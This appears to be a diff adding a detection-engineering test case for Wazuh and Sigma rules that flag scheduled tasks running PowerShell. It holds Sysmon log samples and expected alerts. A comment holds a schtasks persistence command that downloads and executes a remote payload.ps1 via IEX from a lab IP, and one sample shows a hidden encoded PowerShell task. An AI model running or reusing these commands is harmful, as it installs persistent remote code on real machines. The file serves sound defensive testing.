@@ -1,0 +1,99 @@
+---
+test_id: TC-100017
+rule_id: 100018
+rule_name: Suspicious Scheduled Task with Scripting Payload
+mitre_technique: T1053.005
+wazuh_rule_file: detections/wazuh-rules/100017-suspicious-scheduled-task.xml
+sigma_rule_file: detections/sigma/sigma-100017-suspicious-scheduled-task.yml
+
+# --- Positive Test (schtasks + PowerShell — rule 100018) ---
+positive_test:
+  description: >
+    Sysmon EventID 1 (ProcessCreate) for schtasks.exe with a /create command
+    that runs powershell.exe as the task action. Simulates an attacker
+    creating a persistence task that downloads and executes a payload.
+  art_test:
+    technique: T1053.005
+    test_number: 1
+    command: |
+      # [victim-windows] ART T1053.005 Test 1 — scheduled task persistence
+      Invoke-AtomicTest T1053.005 -TestNumbers 1
+      # Direct equivalent:
+      # schtasks /create /tn "AtomicTask" /tr "powershell.exe -ep Bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.64.30/payload.ps1')" /sc daily /st 09:00
+  log_samples:
+    - |
+      {
+        "win": {
+          "system": {
+            "eventID": "1",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "computer": "victim-windows"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\system32\\schtasks.exe",
+            "commandLine": "schtasks  /create /tn AtomicTask /tr \"powershell.exe -ep Bypass -c Write-Host Test\" /sc daily /st 09:00",
+            "parentImage": "C:\\Windows\\System32\\cmd.exe",
+            "user": "victim-windows\\SOCAdmin"
+          }
+        }
+      }
+  expected_output:
+    alert_fired: true
+    rule_id: 100018
+    rule_level: 12
+    rule_description_contains: "Scheduled task created with scripting engine payload"
+    relevant_fields:
+      win.eventdata.image_endswith: "schtasks.exe"
+      win.eventdata.commandLine_contains: "powershell"
+
+# --- Positive Test (obfuscated payload — rule 100019) ---
+positive_test_obfuscated:
+  description: >
+    schtasks.exe creating a task with an encoded PowerShell command as the action.
+    Should escalate to rule 100019 (level 14).
+  log_samples:
+    - |
+      {
+        "win": {
+          "system": { "eventID": "1", "computer": "victim-windows" },
+          "eventdata": {
+            "image": "C:\\Windows\\system32\\schtasks.exe",
+            "commandLine": "schtasks /create /tn Updater /tr \"powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0\" /sc hourly",
+            "user": "victim-windows\\SOCAdmin"
+          }
+        }
+      }
+  expected_output:
+    alert_fired: true
+    rule_id: 100019
+    rule_level: 14
+    rule_description_contains: "Scheduled task with obfuscated/temp-path PS payload"
+
+# --- Negative Test ---
+negative_test:
+  description: >
+    Windows Task Scheduler creating a WMI provider host maintenance task —
+    legitimate schtasks.exe usage without a scripting engine payload.
+  log_samples:
+    - |
+      {
+        "win": {
+          "system": { "eventID": "1", "computer": "victim-windows" },
+          "eventdata": {
+            "image": "C:\\Windows\\system32\\schtasks.exe",
+            "commandLine": "schtasks /create /tn \\Microsoft\\Windows\\WDI\\ResolutionHost /tr %WinDir%\\System32\\sdiagnhost.exe /sc onlogon",
+            "user": "NT AUTHORITY\\SYSTEM"
+          }
+        }
+      }
+  expected_output:
+    alert_fired: false
+    note: "sdiagnhost.exe is not a scripting engine — commandLine does not match powershell/cmd/wscript filter"
+
+validation:
+  command: |
+    sudo /var/ossec/bin/wazuh-logtest
+    # PowerShell task event → Rule 100018 level 12
+    # Encoded command task event → Rule 100019 level 14
+    # WDI maintenance task → no custom rule fires
+  expected_logtest_output_fragment: "Rule Id: 100018"
